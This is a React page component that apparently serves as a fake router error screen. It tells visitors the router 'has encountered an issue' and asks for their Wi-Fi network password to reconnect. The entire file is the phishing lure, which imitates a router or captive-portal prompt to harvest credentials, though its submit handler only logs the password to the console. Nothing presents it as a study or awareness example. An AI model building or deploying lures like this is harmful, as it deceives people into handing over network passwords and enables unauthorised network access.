import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import routerReferenceImage from "@/assets/router-reference.jpg";

const Index = () => {
  const [password, setPassword] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    console.log("Password submitted:", password);
    // Handle password submission here
  };

  return (
    <div 
      className="min-h-screen relative flex items-center justify-center p-4 overflow-hidden"
    >
      {/* Background Image with Blur */}
      <div 
        className="absolute inset-0 z-0"
        style={{
          backgroundImage: `url(${routerReferenceImage})`,
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundRepeat: 'no-repeat',
          filter: 'blur(8px)',
          transform: 'scale(1.1)'
        }}
      />
      
      {/* Dark Overlay */}
      <div className="absolute inset-0 bg-black/60 z-10" />
      
      {/* Content */}
      <div className="relative z-20 w-full max-w-sm sm:max-w-md">
        {/* Large Router Image */}
        <div className="mb-8 flex justify-center">
          <img 
            src={routerReferenceImage} 
            alt="Real Router with Network Issue" 
            className="w-32 h-32 sm:w-40 sm:h-40 md:w-48 md:h-48 object-contain drop-shadow-2xl"
          />
        </div>
        
        <Card className="backdrop-blur-md border-router-border shadow-2xl" 
              style={{ backgroundColor: "var(--router-card)" }}>
          <CardHeader className="text-center pb-4 px-4 sm:px-6">
            <CardTitle className="text-xl sm:text-2xl font-display font-bold text-white flex items-center justify-center gap-2 leading-tight">
              📶 Router Has Encountered an Issue
            </CardTitle>
            <p className="text-accent mt-2 text-sm sm:text-base">
              Please enter your network password to reconnect
            </p>
          </CardHeader>
          <CardContent className="px-4 sm:px-6">
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="password" className="text-white font-medium text-sm sm:text-base">
                  Network Password
                </Label>
                <Input
                  id="password"
                  type="password"
                  placeholder="Enter your WiFi password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="bg-white/10 border-router-border text-white placeholder-white/60 focus:border-accent h-10 sm:h-11 text-sm sm:text-base"
                  required
                />
              </div>
              <Button 
                type="submit" 
                className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-semibold py-2 h-10 sm:h-11 text-sm sm:text-base"
              >
                Reconnect Network
              </Button>
            </form>
            <div className="mt-6 text-center">
              <p className="text-white/70 text-xs sm:text-sm">
                Having trouble? Contact your network administrator
              </p>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default Index;
